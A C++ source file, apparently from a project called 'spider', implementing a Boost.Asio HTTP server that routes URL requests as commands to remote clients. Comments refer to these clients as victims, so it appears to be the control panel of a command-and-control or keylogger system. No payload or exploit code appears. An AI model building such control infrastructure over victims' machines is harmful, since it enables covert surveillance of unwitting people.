#include <chrono>
#include <thread>
#include "WebServer.h"
#include "Logger.hpp"
#include "WebServer.h"

namespace spider
{
namespace http
{

WebServer::WebServer(server::CommandCenter const &cmdCenter, volatile bool const &running, std::uint32_t port) : AControl(cmdCenter, running), m_port(port), m_routes(), m_io_service(),
  m_acceptor(m_io_service, boost::asio::ip::tcp::endpoint(boost::asio::ip::tcp::v4(), m_port)), m_cmdCenter(cmdCenter), m_running(running), m_clientCount(0)
{
  nope::log::Log(Info) << "Creating WebServer";
  nope::log::Log(Debug) << "creating custom routes for WebServer";
  m_routes["404"] = [&](std::uint32_t askId)
  {
      std::uint32_t id = 0; //victim client's id


      nope::log::Log(Info) << "Someone requested 404";
      server::Event ev;
      ev.destId = id;
      ev.emitter = this;
      ev.askId = askId;
      ev.commandName = "404";

      sendEvent(ev);
  };

  for (auto const &cur : m_commands)
  {
    nope::log::Log(Info) << "route: " << cur.name;
    m_routes["/" + cur.name] = [&](std::uint32_t askId)
    {
      std::uint32_t id = 0; //victim client's id

      std::string url ("/" + cur.name);
      std::stringstream ss(url.substr(url.find_last_of("/") + 1));
      ss >> id;

      nope::log::Log(Info) << "route for: " << url << " requested on client " << id;
      server::Event ev;
      ev.destId = id;
      ev.emitter = this;
      ev.askId = askId;
      ev.commandName = cur.name;

      sendEvent(ev);

      /*sleep(10);
        std::stringstream res;
        std::string sHTML = "GETINFO HERE";
        res << "HTTP/1.1 200 OK" << std::endl;
        res << "content-type: text/html" << std::endl;
        res << "content-length: " << sHTML.length() << std::endl;
        res << std::endl;
        res << sHTML;
        return (res.str());*/
    };
  }
}

WebServer::~WebServer()
{
}

bool WebServer::pollEvent(server::Event &ev)
{
  return (AControl::pollEvent(ev));
}

void WebServer::sendResponse(server::Event const &ev)
{
  AControl::sendResponse(ev);
}

void WebServer::sendEvent(server::Event &ev)
{
  AControl::sendEvent(ev);
}

void WebServer::run()
{
  m_acceptor.listen();
  acceptClient(m_acceptor, m_io_service, m_routes, m_clientCount, m_clients);
  nope::log::Log(Info) << "WebServer started on port: " << m_port << "." << std::endl;
  //TODO: running gestion
  while (m_running)
  {
    m_io_service.poll_one();
    m_io_service.reset();
    checkResponse();
  }
}

void WebServer::checkResponse()
{
  while (!m_responseQueue.empty())
  {
    server::Event ev = m_responseQueue.front();
    m_responseQueue.pop();
    for (auto &client : m_clients)
    {
      if (ev.askId == client->getId())
      {
        std::shared_ptr<std::string> str = std::make_shared<std::string>("Test RESPONSE");
        boost::asio::async_write(client->getSocket(), boost::asio::buffer(str->c_str(), str->length()),
            [&client, str](boost::system::error_code const &e, std::size_t n)
            {
            nope::log::Log(Debug) << "wrtting on socket...";
            });
        nope::log::Log(Info) << "sending response to AControl's client";
        break;
      }
    }
  }
}

void WebServer::acceptClient(boost::asio::ip::tcp::acceptor &acceptor, boost::asio::io_service &io_service,
    std::map<std::string, std::function<void(std::uint32_t)>> &routes, std::uint32_t &clientCount, std::vector<std::shared_ptr<HTTPUserSession>> &clients)
{
  std::shared_ptr<HTTPUserSession> client = std::make_shared<HTTPUserSession>(io_service, routes, clientCount++);
  clients.push_back(client);
  acceptor.async_accept(client->getSocket(), [client, &acceptor, &io_service, &routes, &clientCount, &clients](const boost::system::error_code &e)
      {
      WebServer::acceptClient(acceptor, io_service, routes, clientCount, clients);
      if (!e)
      {
      client->sessionStart(client);
      }
      else
      {
      nope::log::Log(Error) << "cannot accept client on WebServer :/";
      }
      });
}

void WebServer::addRoute(std::string url, std::function<void(std::uint32_t)> x)
{
  m_routes[url] = x;
}
}
}
